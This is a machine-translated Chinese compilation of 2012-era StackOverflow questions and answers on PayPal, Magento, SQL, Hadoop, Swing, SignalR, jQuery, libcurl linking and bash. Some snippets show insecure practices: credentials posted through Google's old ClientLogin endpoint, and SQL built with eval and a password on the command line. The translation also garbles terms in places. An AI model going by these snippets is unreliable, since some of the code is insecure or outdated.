# StackOverflow 问答 13524000-13524999

# php - 付款后在支付专业贝宝（sandox）中设置自动重定向

> ID：13524000
> 
> 赞同：1
> 
> 时间：2012-11-23T06:18:52.113
> 
> 标签：php, html, redirect, paypal, paypal-sandbox

我正在测试 paypal 的付款流程。我正在使用 Paypal Website Payment Pro 解决方案。PayPal 交易完成后，PayPal 会显示以下付款成功消息：

```
Thanks for your order
Your payment of $XXXX.XX USD is complete.
You're now going back to MYSITE.
If you are not redirected within 10 seconds, click here. 
```

我想跳过此页面并直接转到我指定的页面 url。

我已按照贝宝文档中提到的此说明进行操作。

1：登录paypal沙箱账号

2：我转到个人资料选项卡，然后在网站付款设置下转到网站付款专业托管解决方案，然后转到设置

有一个自动返回选项。我启用自动返回单选框并插入返回 url .ans 然后保存它。

但问题是它不是自动重定向。它显示相同的贝宝付款成功页面，如果用户点击取消按钮，则弹出消息“继续或取消按钮”，那么它不会重定向到我指定的网址（我不要）

我知道这个问题可能是重复的。但我问这个问题的原因是贝宝确实变化很快。

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T06:44:56.957

如果您使用 PAYPAL php SDK 那么您必须制作一个像“success.php”这样的成功页面，并且在 payment.php 文件中您必须设置该文件的成功 URL（success.php）。

# java - 使用函数 calcOpticalFlowPyrLK

> ID：13524005
> 
> 赞同：1
> 
> 时间：2012-11-23T06:19:04.967
> 
> 标签：java, android, opencv

我们可以使用 «MatOfPoint2f prevPts» 方法 Video.calcOpticalFlowPyrLK 中所有点 MatOfPoint2f[] 的数组作为输入参数，就像在 Windows 的 OpenCV 中一样？

对于 Android，我只能执行以下操作：

```
Video.calcOpticalFlowPyrLK(Cadr_Prev,Cadr_Current,
 Point_PrevPts[iindex],
 Point_CurrentPts[iindex],
 _bstatus[iindex], 
 _trackError[iindex]); 
```

PS我为每个点循环运行函数calcOpticalFlowPyrLK，它会影响生产力。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-27T07:40:49.200

OpenCv 开发人员的回答：我通过 MatOfPoint2f::fromArray() 方法从 Point[] 数组创建 MatOfPoint2f。

# java - 用于文件下载或保存文件的 Jsp 标签？

> ID：13524007
> 
> 赞同：0
> 
> 时间：2012-11-23T06:19:14.920
> 
> 标签：java, html, jsp, jakarta-ee

在我的 JSP 页面中，我应该能够单击一个按钮，该按钮将打开小部件以执行文件保存选项。看起来 type=”xxxx” 的输入标签可以用于文件上传。我需要能够下载或保存文件。有什么可用的吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T06:42:09.850

您需要从服务器发送带有标头的响应

> 内容处置：附件；文件名="你的文件名.ext"

然后只需`<a>`在您的页面中添加带有`href =`url 的标签，该 url 为带有所需响应标头的文件提供服务。

# magento - 如何在 magento CMS 页面中添加共享按钮？

> ID：13524009
> 
> 赞同：1
> 
> 时间：2012-11-23T06:19:40.007
> 
> 标签：magento

我在 Magento 中创建了 CMS 页面，我想使用 Facebook、Twitter、Google+ 的分享按钮与社交网站分享，所以有人告诉我该怎么做吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-23T06:39:50.777

将此部分添加到：

```
your_package/your_theme/template/page/html/head.phtml 
```

在这一行之前 -->`<?php echo $this->helper('core/js')->getTranslatorScript() ?>`

```
<script type="text/javascript" src="http://w.sharethis.com/button/buttons.js"></script>
<script type="text/javascript">stLight.options({publisher: "ur-c297c92f-9661-1cf3-697d-47c19ab7e281"});</script> 
```

将此部分添加到您的 cms 页面：

```
<span class='st_facebook_hcount' displayText='Facebook'></span>
<span class='st_twitter_hcount' displayText='Tweet'></span>
<span class='st_googleplus_hcount' displayText='Google +'></span> 
```

**注意：**使用 sharethis 扩展

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-23T09:30:21.457

您可以在下面的 URL 中查看 Addthis 按钮，选择要共享的按钮样式，获取代码并将该代码添加到 Magento Admin >> CMS >> Pages。单击编辑器的 Html 视图并粘贴您从 Addthis 站点获取的代码，您将在前端看到共享按钮。另一种方法是您可以将此代码添加到您的模板文件中常用的示例 1column.phtml 用于 CMS 页面，您需要在所有 CMS 页面上共享按钮，然后您可以将相同的代码粘贴到 .phtml 模板文件中。

添加这个：[https ://www.addthis.com/get/sharing#.UK8_PoafHcc](https://www.addthis.com/get/sharing#.UK8_PoafHcc)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-04-03T05:56:05.170

虽然这是一个旧线程，但我想分享我找到的答案。

1.  在中添加元标记

**模板/页面/html/head.phtml**

```
<meta property="og:site_name" content="yoursite.com"/> 
```

2.  通过将 Facebook 分享按钮代码粘贴到**变量 HTML 值，从****系统/自定义**变量创建自定义变量。

***   要将喜欢/分享按钮添加到 cms 或静态块，请使用“插入变量”按钮插入您刚刚创建的自定义变量。**

# algorithm - 我不明白非确定性图灵机的概念

> ID：13524011
> 
> 赞同：33
> 
> 时间：2012-11-23T06:19:51.427
> 
> 标签：algorithm, state, turing-machines, non-deterministic

我不了解*非确定性图灵机*的概念。我想我理解术语*非确定性算法*：（非确定性算法是一种算法，它可以在不同的运行中表现出不同的行为，而不是确定性算法。）所以算法可能像：

```
a = fromSomeAlgo();

if(a > foo)
   stateA();
else
   stateB(); 
```

但是对于我[读过的](https://stackoverflow.com/questions/3671429/why-are-np-problems-called-that-way-and-np-hard-and-np-complete)*非确定性图灵机*，它在给定时间可以处于多个状态。还有一篇[维基百科文章](http://en.wikipedia.org/wiki/Non-deterministic_Turing_machine)建议*“非确定性图灵机 (NTM)，可能有一组规则，为给定情况规定了多个动作”*。

 *这意味着什么 ？*..针对给定情况的不止一个动作...多个状态...*我根本不明白这一点。

* * *

## 回答 #1

> 赞同：47
> 
> 时间：2012-11-23T06:53:30.687

在非确定性图灵机中，在每个分支中——你都做了两种可能性——只有当你完成后，你才“选择”哪一个是你需要的解决方案（如果存在的话）。

例如，让我们看[一下子集和问题](http://en.wikipedia.org/wiki/Subset_sum_problem)，其中`S = {a,b,c... }`. 非确定性图灵机有一个线性解：

```
for each element:
   "guess" if it is in the subset
check if the subset has the specified sum 
```

生成的树将是这样的：

```
 start
                 with a                                      without a
               /         \                                   /          \
              /           \                                 /            \
             /             \                               /              \
      with b               without b                  with b              without b
      /     \               /       \                 /     \             /        \
  with c    without c    with c     without c     with c    without c    with c     without c 
```

一个计算（树中的路径）是正确的就足够了，以便算法产生“真”。只有在没有这样的计算时才会产生“假”。

非确定性图灵机的概念纯粹是理论上的——没有可用的非确定性图灵机。

**奖励：**
请注意，可以使用非确定性图灵机完成的所有事情 - 都可以使用确定性图灵机完成（反之亦然） - 例如，[停机问题](http://en.wikipedia.org/wiki/Halting_problem)在任何一个中都无法决定。但是，NPC 问题可以在非确定性图灵机中以多项式方式完成，我们不知道（并且我们假设我们不能）如何在确定性图灵机上以多项式方式完成。*

# automata - 正则表达式澄清的有限自动机

> ID：13524012
> 
> 赞同：0
> 
> 时间：2012-11-23T06:20:03.253
> 
> 标签：automata

你能检查一下吗：[https ://dl.dropbox.com/u/25439537/finite%20automata.png](https://dl.dropbox.com/u/25439537/finite%20automata.png)

这是一个检查作业，所以不要担心。我只是想澄清一下我的答案是否正确，因为它被我的老师标记为不正确。

我的答案是 ((a+b)(a+b))*a 第一个 (a+b) 表示上箭头。第二个 (a+b) 表示下箭头。最后一个'a'告诉我们它应该总是以'a'结尾。

我只是想记录很多专家的证据，以便我可以把它交给我的老师。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T06:49:33.433

我相信你的回答是正确的。

让我们将整个过程分为两个部分：（1）从 开始`start`，然后返回`start`；(2) 去`start`接受`end`。显然，（1）部分是一个循环。

对于 (1)，从 开始`start`，接受`b`或`a`。因为`b`，该`b(a+b)`回去了。因为`a`，该`a(a+b)`回去了。所以 (1) 是`b(a+b) + a(a+b)`是`(a+b)(a+b)`。

对于 (2)，它是`a`'.

所以，最终的结果是`(loop in (1))* (2)`ie `( (a+b)(a+b) )* a`。

按照上面的描述，你也可以拿出两者等价的证明。证明部分（a）自动机接受的每个序列都在集合中`((a+b)(a+b))*a`；部分 (b) 集合中的每个序列`((a+b)(a+b))*a`都被自动机接受。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T19:27:00.463

您的答案是*错误*的，因为它不提供以**b**开头的字符串。

路径*(start) -> b -> a+b -> a -> (end)*被您的有限自动机接受，但不被您的正则表达式接受。您的答案正确的最简单的反例是正则表达式拒绝字符串“baba”。

顺便说一句，如果老师给你的正则表达式没有两个同心圆的“结束”状态（表示接受状态），那可能是一个棘手的问题。没有接受状态意味着你的自动机拒绝一切。最好的描述方式就是写下 {}（空集）。

# python - 在python中将GMT时间转换为当地时间

> ID：13524020
> 
> 赞同：0
> 
> 时间：2012-11-23T06:20:33.340
> 
> 标签：python, datetime

我有一个日期（日期时间），它作为 GMT 时间存储在数据库中。我需要将其转换为当地时间。如何使用 python 实现这一点

请有你的建议

提前致谢！！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T06:36:00.167

您是否阅读过 Python 文档[8.1 *`datetime`— 基本日期和时间类型*](http://docs.python.org/3.3/library/datetime.html) ，尤其是[8.3*`tzinfo`对象*](http://docs.python.org/3.3/library/datetime.html#tzinfo-objects)？

他们描述了库函数[`datetime.astimezone(`*tz=None*`)`](http://docs.python.org/3.3/library/datetime.html#datetime.datetime.astimezone)，这可能正是您想要的。

> 返回具有新 tzinfo 属性 tz 的 datetime 对象，调整日期和时间数据，使结果与 self 相同的 UTC 时间，但在 tz 的本地时间。

他们有示例代码，用于根据与 UTC 的偏移量定义时区，以如下声明结尾：

```
Pacific  = USTimeZone(-8, "Pacific",  "PST", "PDT") 
```

读完之后，你的问题是什么？

你有一个`date`或一个`datetime`？即数据是否有时区成分？如果没有时间组件，那么将日期更改为不同的时区是什么意思？

你有“天真”还是“有意识” `datetime`？从文档中，

> 感知对象对适用的算法和政治时间调整（例如时区和夏令时信息）有足够的了解，以相对于其他感知对象定位自身。有意识的对象用于表示不可解释的特定时刻......
> 
> 一个天真的对象不包含足够的信息来明确地定位自己相对于其他日期/时间对象。一个简单的对象是表示协调世界时 (UTC)、当地时间还是某个其他时区的时间完全取决于程序，就像特定数字是否表示米、英里或质量一样取决于程序。朴素的对象很容易理解和使用，但代价是忽略了现实的某些方面。

Python 文档非常好。也许它会回答您的问题，而无需您询问 StackOverflow。

# sql - SQL Server 在特定列的所有行中查找和替换特定单词

> ID：13524021
> 
> 赞同：67
> 
> 时间：2012-11-23T06:20:36.793
> 
> 标签：sql, sql-server, sql-server-2008

我有一个`TblKit`包含列`Id`和`Number`. `Id`是`primary key`类型`int`并且`Number`是`varchar(50)`。

表中的数据如下所示：

```
Id     Number
---    ------
1      KIT001
2      KIT002 
3      DMB001
4      DM002
5      KIT003 
```

我想用数字字段中的所有行`KIT%`替换`CH`。所需的输出如下所示：

```
Id     Number
---    ------
1      CH001
2      CH002 
3      DMB001
4      DM002
5      CH003 
```

我试过这个更新查询：

```
UPDATE TblKit SET Number = REPLACE(Number, N'%KIT%', 'CH') 
```

但它不起作用。

任何人都可以帮我解决这个问题吗？

* * *

## 回答 #1

> 赞同：140
> 
> 时间：2012-11-23T06:22:21.650

```
UPDATE tblKit
SET number = REPLACE(number, 'KIT', 'CH')
WHERE number like 'KIT%' 
```

*   [SQLFiddle 演示](http://sqlfiddle.com/#!3/cac38/1)

或者如果你确定你没有这样的值，就简单地这样做`CKIT002`

```
UPDATE tblKit
SET number = REPLACE(number, 'KIT', 'CH') 
```

*   [SQLFiddle 演示](http://sqlfiddle.com/#!3/348e3/1)

# iphone - 如何在 iphone 中重绘基于 UIBezierpath 的 textview 文本 contentsize

> ID：13524022
> 
> 赞同：4
> 
> 时间：2012-11-23T06:20:52.173
> 
> 标签：iphone, resize, ios6, uitextview, uibezierpath

我在 uiview 中使用 UIBezierpath 绘制消息气泡。我在贝塞尔路径内渲染文本视图。我的问题是当我在 textview 中输入文本时，我想动态增加消息气泡大小，但我不能这样做。如何解决这个问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T06:40:33.867

您可以调整 UIBezierpath 相对于您的 UITextview 框架大小，如下所示：

```
CGRect box = CGPathGetBoundingBox(bezierpath.CGPath)
CGFloat scaleX = textView.frame.size.width / box.frame.size.width;
CGFloat scaleY = textView.frame.size.height / box.frame.size.height;
CGAffineTransform transform = CGAffineTransformMakeScale(scaleX, scaleY);
CGPathRef intermediatePath = CGPathCreateCopyByTransformingPath(bezierpath.CGPath, &transform);
bezierPath.CGPath = intermediatePath;
CFRelease(intermediatePath); 
```

希望有帮助！

# apache - hadoop hive加载错误

> ID：13524024
> 
> 赞同：0
> 
> 时间：2012-11-23T06:21:00.473
> 
> 标签：apache, hadoop, hive

通过 hive 将文件加载到 hadoop 时。我收到以下错误：

```
Failed with exception org.apache.hadoop.hdfs.server.namenode.NotReplicatedYetException: Not replicated yet:/tmp/hive-hadoop/hive_2012-11-22_19-31-25_550_6464715632657097841/-ext-10000/outlog_11_oct12.csv
    at org.apache.hadoop.hdfs.server.namenode.FSNamesystem.getAdditionalBlock(FSNamesystem.java:1257)
    at org.apache.hadoop.hdfs.server.namenode.NameNode.addBlock(NameNode.java:422)
    at sun.reflect.GeneratedMethodAccessor17.invoke(Unknown Source)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at org.apache.hadoop.ipc.RPC$Server.call(RPC.java:508)
    at org.apache.hadoop.ipc.Server$Handler$1.run(Server.java:959)
    at org.apache.hadoop.ipc.Server$Handler$1.run(Server.java:955)
    at java.security.AccessController.doPrivileged(Native Method)
    at javax.security.auth.Subject.doAs(Subject.java:396)
    at org.apache.hadoop.ipc.Server$Handler.run(Server.java:953)

FAILED: Execution Error, return code 1 from org.apache.hadoop.hive.ql.exec.CopyTask 
```

根据其他线程，它的数据节点问题，但我所有的数据节点都已启动并运行。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T13:43:34.077

我认为问题可能是目录缺少写权限`/tmp`。

试试`hadoop dfs -chmod g+w /tmp`？

# java - Mouselistener 和 mouseclicked

> ID：13524029
> 
> 赞同：0
> 
> 时间：2012-11-23T06:21:19.830
> 
> 标签：java, swing, jbutton, mouselistener

我只是在搞乱 MouseListener 并想在`buttP`单击时向我的面板添加一个新的 JButton；但是，当我按 时它不会刷新面板`buttP`。我尝试了重绘方法，但这不起作用。任何人都知道我如何刷新面板以便`JButton`自动显示新的？

```
public class Panel extends JPanel{

private JButton buttP;
public Panel(){
    buttP = new JButton("TEST");
    buttP.addMouseListener(new addNewButtMouseListener());
    add(buttP);
}

private class addNewButtMouseListener implements MouseListener{

    @Override
    public void mouseClicked(MouseEvent e) {
        JButton b = new JButton("HA");
        add(b);
    }

    @Override
    public void mousePressed(MouseEvent e) {
        // TODO Auto-generated method stub

    }

    @Override
    public void mouseReleased(MouseEvent e) {
        // TODO Auto-generated method stub

    }

    @Override
    public void mouseEntered(MouseEvent e) {
        // TODO Auto-generated method stub

    }

    @Override
    public void mouseExited(MouseEvent e) {
        // TODO Auto-generated method stub

    }

} 
```

}

非常感谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T06:24:02.980

尝试使用`invalidate()`或`revalidate()`。

顺便说一句，不要改用`MouseListener`（@mKorbel 为 +1）`ActionListener`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T06:33:38.857

*   我认为添加[`MouseListener`](http://docs.oracle.com/javase/tutorial/uiswing/events/mouselistener.html)到的想法[`JButton`](http://docs.oracle.com/javase/tutorial/uiswing/components/button.html)是错误的

*   必须添加[`SwingAction`](http://docs.oracle.com/javase/tutorial/uiswing/misc/action.html)，[`ActionListener`](http://docs.oracle.com/javase/tutorial/uiswing/events/actionlistener.html)

*   [代码示例和所需的方法](https://stackoverflow.com/a/6989230/714968)

# c# - 在 Datagrid 中的选定单元格上绘制一个矩形

> ID：13524031
> 
> 赞同：0
> 
> 时间：2012-11-23T06:21:22.733
> 
> 标签：c#, winforms, datagrid

我的`DataGrid`项目中有一个选择模式：`FullRowSelect`. 如何`ListView`在单击的单元格上绘制矩形（如所选单元格上的矩形）？或者改变颜色？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T07:59:04.963

我通过处理 CellFormatting 事件改变了 DataGridViews 的颜色。我这样做是为了突出显示错误的行，或者突出显示特定的列；

在我的表单初始化方法中，我有类似的东西；

```
dgvData.CellFormatting += 
            new DataGridViewCellFormattingEventHandler(dgvData_CellFormatting); 
```

负责格式化的方法如下；

```
 private void dgvData_CellFormatting(object sender,
                                    DataGridViewCellFormattingEventArgs e)
        {
            bool inError = false;

            // Highlight the row as red if we're in error displaying mode
            if (e.RowIndex >= 0 && fileErrors != null && DisplayErrors)
            {
                // Add +1 to e.rowindex as errors are using a 1-based index
                var dataErrors = (from err in fileErrors
                                  where err.LineNumberInError == (e.RowIndex +1)
                                  select err).FirstOrDefault();
                if (dataErrors != null)
                {
                    e.CellStyle.BackColor = Color.Red;
                    inError = true;
                }
            }

            // Set all the rows in a column to a colour, depending on it's mapping.
            Color colourToSet = GetBackgroundColourForColumn(dgvData.Columns[e.ColumnIndex].Name);
            if (colourToSet != null && !inError)
                e.CellStyle.BackColor = colourToSet;
        } 
```

为了对特定的单元格执行此操作，您可能还需要处理控件上的 MouseUp 事件，然后使用数据网格视图的 HitTestInfo 来计算实际命中的单元格。

# php - 通过重定向 URL 自动登录 Gmail 帐户，无需使用 Gmail 登录凭据

> ID：13524033
> 
> 赞同：0
> 
> 时间：2012-11-23T06:21:36.093
> 
> 标签：php, redirect, gmail, autologin

我的任务是让任何用户**在不知道登录凭据的情况下登录 Gmail。**

我创建了一个名为**test.php**的页面，我将在其中传递gmail 帐户**的用户名和密码，****并将其重定向到 Gmail 登录 URL**。

经过研究，我得到了这个**网址**..

[https://accounts.google.com/ServiceLoginAuth?continue=http://mail.google.com/gmail&service=mail&Email=disha26th@gmail.com&Passwd=PASSWORD&null=Sign+in](https://accounts.google.com/ServiceLoginAuth?continue=http://mail.google.com/gmail&service=mail&Email=disha26th@gmail.com&Passwd=PASSWORD&null=Sign+in)

在这里，我的电子邮件会自动填充到**Gmail 登录表单**中，但**不会**自动填充密码。

任何人都可以...解决它..或告诉我其他一些方法来实现它..谢谢..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T06:55:29.807

```
$url = 'https://www.google.com/accounts/ClientLogin';
$params = "accountType=GOOGLE&Email=".$email."&Passwd=".$password."&service=cp&source=moneymagpie"; [$email = Your from email, $password = Your form password]

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $params);

$response = curl_exec($ch); 
```

试试这个代码。

# arduino - 如何在 Atmel Studio 6 中添加头文件

> ID：13524037
> 
> 赞同：2
> 
> 时间：2012-11-23T06:22:01.557
> 
> 标签：arduino, microcontroller, avr, atmel, avr-studio5

我正在尝试使用 Atmel Atudio 6。但我不确定如何将 .h 文件添加到我的项目中。这是允许的吗？如果是这样，我该如何添加它们？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-23T07:55:05.777

如果要添加现有的 .h 文件，只需在*“解决方案资源管理器”中右键单击您的****项目***

 *如果您没有打开解决方案资源管理器视图，您将在菜单项*“查看 -> 解决方案资源管理器”*下找到它）。

然后在弹出菜单中选择*“添加 -> 现有项目...”*（Ctrl+Alt+A）

现在您可以浏览找到您的 .h 文件，选择它并按*“添加”*。

**注意***“添加”*按钮上的小下拉箭头。您可以使用它来选择是否要将 .h 文件复制到项目中，或者只是添加指向现有文件的链接。

如果要添加新文件，请右键单击您的项目，然后选择*“添加 -> 新项目...”*（Ctrl+Shift+A）并选择*“包含文件”*模板。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2015-04-22T17:54:03.497

通常最好添加一个包含目录，编译器在其中查找包含文件（特别是那些包含 < > 标记的文件）。

这可以在 Atmel Studio 6 中完成：项目属性 -> 工具链 -> ARM/GNU C 编译器* -> 目录 -> 添加项目（带有绿色加号的按钮）。

*如果使用 AVR 板，将是 AVR/GNU C 编译器。*

# box2d - 动静体与动体之间的摩擦

> ID：13524039
> 
> 赞同：0
> 
> 时间：2012-11-23T06:22:13.863
> 
> 标签：box2d

所以，我正在开发某种 2d 运行游戏（自动横向滚动）。我创建了由瓷砖组成的平台，以及带有静态物体的坡道和每次更新，我使用 setPosition 将每个瓷砖移动到它的新 x 位置。

有一次，我想在天空中创建盒子体，让它掉到平台上，但是物品和移动体之间的摩擦不起作用。在平坦的地面上，盒子没有走到屏幕的左边（地面从右到左移动）。

我从 box2d 手册中读到

> 如果移动静态物体，摩擦将无法正常工作

那么有没有更好的方法或解决方案？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T09:29:50.143

所以，我发现了我自己。事实证明，具有设定位置的移动体不会引起任何摩擦。你可以想象它就像突然运输它。所以解决方法是将静态体改为运动学并使用setlinearvelocity来移动它

# signalr - SignalR 覆盖 OnConnected()、OnDisconnected()

> ID：13524046
> 
> 赞同：10
> 
> 时间：2012-11-23T06:22:46.447
> 
> 标签：signalr, signalr-hub

我正在尝试覆盖`OnConnected()`,`OnDisconnected()`方法，但我得到：

```
OnConnected()': no suitable method found to override 
```

实现`IDisconnect`、`IConnect`接口和在内部进行处理是否`Connect()`与`Disconnect()`相同？`OnConnected()``OnDisconnected()`

是什么赋予了？

```
public static class UserHandler
{
    public static HashSet<string> ConnectedIds = new HashSet<string>();
}

public class MyHub : Hub
{
    public override Task OnConnected()
    {
        UserHandler.ConnectedIds.Add(Context.ConnectionId);
        return base.OnConnected();
    }

    public override Task OnDisconnected()
    {
        UserHandler.ConnectedIds.Remove(Context.ConnectionId);
        return base.OnDisconnected();
    }
} 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2014-07-29T16:22:44.090

这段代码对我有用，直到今天早上我将 SignalR 从 2.1.0 升级到 2.1.1，现在我得到 OnDisconnected() 的“找不到合适的方法来覆盖”。我相信它需要这样写来解释一个新参数：

```
public override Task OnDisconnected(bool stopCalled = true) 
{
   UserHandler.ConnectedIds.Remove(Context.ConnectionId);
   return base.OnDisconnected(stopCalled); 
} 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-11-23T10:49:02.860

您可能正在使用旧版本的 SignalR。阅读此[http://weblogs.asp.net/davidfowler/archive/2012/11/11/microsoft-asp-net-signalr.aspx](http://weblogs.asp.net/davidfowler/archive/2012/11/11/microsoft-asp-net-signalr.aspx)。

# javascript - 鼠标进入jquery时如何停止淡入淡出动画？

> ID：13524050
> 
> 赞同：0
> 
> 时间：2012-11-23T06:22:56.817
> 
> 标签：javascript, jquery

鼠标进入jquery时如何停止淡入淡出动画？我有这样的代码

```
function fadeItIn() {
    $('.banner_outer1').fadeIn(time, function () {
       $('.banner_outer1').mouseenter(function(){
           //stop animation
           });
       $('.banner_outer1').mouseout(function(){
           //start animation
           });     
        setTimeout(fadeItOut, 1400);
       //fadeItOut();
    });
}

function fadeItOut() {
    $('.banner_outer1').fadeOut(time, function () {
        $('.banner_outer1').html(banner_outer2);
        banner_outer3 = banner_outer2;
        banner_outer2 = banner_outer1;
        banner_outer1 = banner_outer3;
        fadeItIn();
    });
} 
```

我想在鼠标进入 div 时停止动画，并在鼠标离开 div 时恢复动画。我怎么能在jquery中做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T06:46:46.380

```
<script src="http://code.jquery.com/jquery.min.js" type="text/javascript"></script>
<script type="text/javascript">
    $(document).ready(function(){
        function bind()
        {
            $('.fader').bind('fade-cycle', function() {
                $(this).fadeOut('fast', function() {
                    $(this).fadeIn('fast', function() {
                        $(this).trigger('fade-cycle');
                    });
                });
            });
        }
        bind(); // binding fade-cycle trigger to .fader
        $('.fader').trigger('fade-cycle'); // starting animation by triggering fade-cycle event

        $('.fader').mouseover(function(){
            $('.fader').unbind('fade-cycle'); // stopping animation by unbinding the fade-cyle
        });
        $('.fader').mouseout(function(){
            // restart animation by rebinding and triggering the fade-cycle event
            bind();
            $(this).trigger('fade-cycle');
        });
    });
</script>

<div class="fader">
    paste your content here that you want to animate (fadein & fadeout continuously)
</div> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T06:27:26.513

```
$('.banner_outer1').hover(
  handlerIn,
  handlerOut
);

function handlerIn(){
    // do some stuff here on mouseenter
}

function handlerOut(){
    // do some stuff here on mouseout
} 
```

[http://api.jquery.com/hover/](http://api.jquery.com/hover/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T06:30:07.543

您可以尝试在鼠标悬停事件中设置一个布尔变量..并使用它来停止动画

```
var shouldAnimate;

$('.banner_outer1').mouseOver(function(){
  shouldAnimate = false;
});

$('.banner_outer1').mouseLeave(function(){
  shouldAnimate = true;
});

function fadeItIn() {
  if (shouldAnimate){
    $('.banner_outer1').fadeIn(time, function () {
       $('.banner_outer1').mouseenter(function(){
           });
       $('.banner_outer1').mouseout(function(){
           });     
    });
   }
    setTimeout(fadeItOut, 1400);
}

function fadeItOut() {
   if (shouldAnimate){
    $('.banner_outer1').fadeOut(time, function () {
        $('.banner_outer1').html(banner_outer2);
        banner_outer3 = banner_outer2;
        banner_outer2 = banner_outer1;
        banner_outer1 = banner_outer3;
        fadeItIn();
    });
  }
} 
```

# c - 安装 libcurl 和非 root 用户：需要配置代码查找 libcurl.so.4 的位置

> ID：13524053
> 
> 赞同：2
> 
> 时间：2012-11-23T06:23:13.013
> 
> 标签：c, gcc, root, libcurl

我已经使用以下配置标志在系统和非 root 用户上成功安装了 libcurl：

```
./configure --prefix=/path/to/lib --exec-prefix=/path/to/lib --bindir=/path/to/lib 
```

一切正常运行编译如下：

```
gcc -I/path/to/include -L/path/to/lib/ client.c -lcurl -o client 
```

当我尝试运行生成的程序时，问题就出现了。我收到以下错误：

```
client: error while loading shared libraries: libcurl.so.4: cannot open shared object file: No such file or directory 
```

我用谷歌搜索了一下，发现它已被报告（并被拒绝）为[这里](http://curl.haxx.se/mail/tracker-2009-05/0014.html)的一个错误，但我仍然不清楚如何解决这个问题。按照响应中的建议使用`ldconfig`需要root权限，我显然没有。

我能做些什么来让这一切顺利进行吗？看起来这应该很简单，但如果是这样，我就完全想念它了......

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T07:41:03.427

如果您不想依赖环境变量，可以使用[rpath](https://en.wikipedia.org/wiki/Rpath)：

```
gcc -I/path/to/include -L/path/to/lib/ client.c -lcurl -Wl,-rpath,/path/to/lib -o client 
```

这将`/path/to/lib`在可执行文件中进行硬编码，以便动态链接器`.so`首先在此处搜索。

（还请注意，在一般情况下，使用`-rpath`被认为是不好的做法：如果 RPATH 目录可由 root 以外的任何人写入，则可能导致安全问题。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T07:13:03.627

设置`LD_LIBRARY_PATH`环境变量以动态告诉您的程序在哪里寻找共享库。在您的情况下，使用 Bourne/bash shell，您可能会执行以下操作：

```
$ LD_LIBRARY_PATH=/path/too/lib
$ export LD_LIBRARY_PATH
$ ./client 
```

有关详细信息，请参阅[共享库 HOWTO](http://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html)。另请注意，通常，您不应该考虑`LD_LIBRARY_PATH`生产解决方案：您最终希望让系统管理员配置系统加载路径或将库安装在正确的位置。

# mysql - 如何在bash下将模式文件插入mysql

> ID：13524056
> 
> 赞同：0
> 
> 时间：2012-11-23T06:23:30.343
> 
> 标签：mysql, bash

我想通过 bash 下的 mysql 命令将模式文件内容作为单个字段插入 MySQL 数据库。在mysql命令行下很容易做到。但我的情况是我想将它与几个动态变量一起使用。代码如下所示：（i 是服务的索引）

```
 WSDL=`cat ${WSDL_FILE}`
    WADL=`cat ${WADL_FILE}`
    XSD=`cat ${XSD_FILE}`

    ADD_SERVICE=$(eval echo "insert into Services set Name=\'\${SRV_LIST_${i}}\', Description=\'\${SRV_LIST_${i}_Description}\', Version=\'\${SRV_LIST_${i}_Version}\', Status=\'Active\', WSDL=\'\'\'${WSDL}\'\'\', WADL=\'\'\'${WADL}\'\'\', XSD=\'\'\'${XSD}\'\'\', CreatedBy=\'${USER}\', CreatedOn=NOW\(\), CreatedAt=\'${HOSTNAME}\';")
    Result=$(mysql -umysql -pmysqlpasswd -D service_reg -e "${ADD_SERVICE}") 
```

结果如下：

```
./ServiceRegistry.sh: eval: line 279: syntax error near  unexpected token `newline'
./ServiceRegistry.sh: eval: line 279: `echo insert into Services set Name=\'${SRV_LIST_1}\', Description=\'${SRV_LIST_1_Description}\', Version=\'${SRV_LIST_1_Version}\', Status=\'Active\', WSDL=\'\', WADL=\'<?xml version="1.0" encoding="UTF-8"?>' 
```

但是如果我将 WSDL、WADL 和 XSD 设置为空字符串，它就可以正常工作。有任何想法吗？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T12:31:20.890

这似乎是罪魁祸首

```
WADL=\'<?xml version="1.0" encoding="UTF-8"?>' 
```

双引号没有转义，字符串过早终止并重新打开。也许，还有更多的报价。

# c# - c#中的产量中断

> ID：13524057
> 
> 赞同：0
> 
> 时间：2012-11-23T06:23:47.690
> 
> 标签：c#, vb.net, iterator

除了从返回或让函数完成到最后，它有什么不同吗？注意 VB.NET 没有**yield break**但要求函数用**iterator**关键字标记。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T06:30:22.150

